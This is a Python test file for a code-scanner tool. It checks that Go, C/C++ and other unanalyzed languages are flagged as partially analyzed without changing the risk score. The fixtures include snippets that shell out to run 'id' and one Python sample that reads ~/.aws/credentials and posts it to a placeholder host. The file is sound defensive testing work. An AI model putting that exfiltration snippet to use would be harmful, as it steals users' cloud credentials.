"""0.58.0 / schema 1.7: code in a language no scanner reads for behavior is said out loud.

Shell, network, file access and dynamic code are detected in Python and JavaScript/TypeScript only.
A Go server that shelled out and posted a credential file scored "low" under the headline
"No malicious indicators", with nothing telling the reader that its Go code was never read.
The score stays as it is (unread code is not evidence); the note and the headline change.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from skilltotal.engine import analyze_directory
from skilltotal.models import Component

_GO = (
    "package main\n"
    'import ("os/exec")\n'
    'func main() { exec.Command("sh", "-c", "id").Run() }\n'
)


def _report(root: Path, files: dict[str, str]):
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return analyze_directory(root, Component(name="x", type="directory", source=str(root)))


def _coverage_notes(report):
    title = "Code in languages not analyzed for behavior"
    return [n for n in report.needs_review if n.title == title]


def test_go_code_is_named_as_unanalyzed_and_the_headline_says_partial(tmp_path: Path):
    report = _report(tmp_path, {"main.go": _GO, "cmd/tool.go": _GO})
    (note,) = _coverage_notes(report)
    assert note.category == "coverage"
    assert "2 Go source file(s)" in note.reason
    assert report.verdict["unanalyzed_code"] == {"Go": 2}
    assert report.verdict["headline"] == (
        "Partially analyzed - Go code not checked for shell, network or file access"
    )
    assert report.verdict["level"] == "low"


def test_the_score_is_not_changed_by_the_note(tmp_path: Path):
    with_go = _report(tmp_path / "a", {"main.go": _GO, "x.py": "x = 1\n"})
    without = _report(tmp_path / "b", {"x.py": "x = 1\n"})
    assert with_go.risk_score == without.risk_score
    assert with_go.risk_level == without.risk_level
    assert [f.id for f in with_go.findings] == [f.id for f in without.findings]


def test_languages_are_listed_most_files_first(tmp_path: Path):
    report = _report(
        tmp_path,
        {"a.rs": "fn main() {}\n", "b.rs": "fn x() {}\n", "c.java": "class C {}\n",
         "d.rb": "puts 1\n", "e.php": "<?php echo 1;\n"},
    )
    assert list(report.verdict["unanalyzed_code"]) == ["Rust", "Java", "PHP", "Ruby"]
    assert "Rust, Java, PHP and Ruby code" in report.verdict["headline"]


def test_test_code_alone_does_not_count(tmp_path: Path):
    report = _report(tmp_path, {"main_test.go": _GO, "tests/helper.go": _GO, "x.py": "x = 1\n"})
    assert not _coverage_notes(report)
    assert "unanalyzed_code" not in report.verdict
    assert report.verdict["headline"] == "No significant risks found"


def test_python_and_javascript_only_components_are_untouched(tmp_path: Path):
    files = {"x.py": "x = 1\n", "y.js": "const y = 1;\n", "z.ts": "let z = 1;\n"}
    report = _report(tmp_path, files)
    assert not _coverage_notes(report)
    assert "unanalyzed_code" not in report.verdict


def test_a_higher_verdict_keeps_its_headline(tmp_path: Path):
    # A credential read next to network egress is a real exfiltration path; that headline wins and
    # the Go note is still recorded.
    py = (
        "import os, urllib.request\n"
        "data = open(os.path.expanduser('~/.aws/credentials')).read()\n"
        "urllib.request.urlopen('https://collect.example.invalid', data.encode())\n"
    )
    report = _report(tmp_path, {"main.go": _GO, "run.py": py})
    assert report.verdict["unanalyzed_code"] == {"Go": 1}
    assert report.verdict["level"] != "low"
    assert not report.verdict["headline"].startswith("Partially analyzed")


# C, C++ and the other common languages no scanner reads for behavior were passed over in silence:
# a native addon that called system() read "No significant risks found".
_C = '#include <stdlib.h>\nint main(void) { return system("id"); }\n'


def test_c_and_cpp_code_is_named_as_unanalyzed(tmp_path: Path):
    report = _report(tmp_path, {"src/main.c": _C, "src/util.h": "int helper(void);\n",
                                "src/addon.cc": "int x = 1;\n"})
    (note,) = _coverage_notes(report)
    assert "3 C/C++ source file(s)" in note.reason
    assert report.verdict["unanalyzed_code"] == {"C/C++": 3}
    assert report.verdict["headline"] == (
        "Partially analyzed - C/C++ code not checked for shell, network or file access"
    )
    assert report.verdict["level"] == "low"


_SUFFIXES = {
    "a.c": "C/C++", "a.h": "C/C++", "a.cc": "C/C++", "a.cpp": "C/C++", "a.cxx": "C/C++",
    "a.hpp": "C/C++", "a.hh": "C/C++", "a.hxx": "C/C++",
    "Program.cs": "C#", "App.swift": "Swift", "Main.kt": "Kotlin", "build.gradle.kts": "Kotlin",
    "Main.scala": "Scala", "main.dart": "Dart", "init.lua": "Lua", "run.pl": "Perl",
    "Lib.pm": "Perl", "app.ex": "Elixir", "mix.exs": "Elixir", "build.groovy": "Groovy",
    "Main.hs": "Haskell", "core.clj": "Clojure", "app.cljs": "Clojure", "shared.cljc": "Clojure",
    "srv.erl": "Erlang", "rec.hrl": "Erlang", "fit.R": "R", "main.zig": "Zig",
}


@pytest.mark.parametrize(("name", "language"), sorted(_SUFFIXES.items()))
def test_each_language_suffix_is_named(tmp_path: Path, name: str, language: str):
    report = _report(tmp_path, {name: "x\n"})
    assert report.verdict["unanalyzed_code"] == {language: 1}


@pytest.mark.parametrize("name", ["view.m", "items.jl", "shader.fs", "run.sh", "setup.ps1",
                                  "build.bat"])
def test_suffixes_of_more_than_one_language_or_read_by_scanners_are_not_named(
    tmp_path: Path, name: str
):
    report = _report(tmp_path, {name: "x\n"})
    assert "unanalyzed_code" not in report.verdict
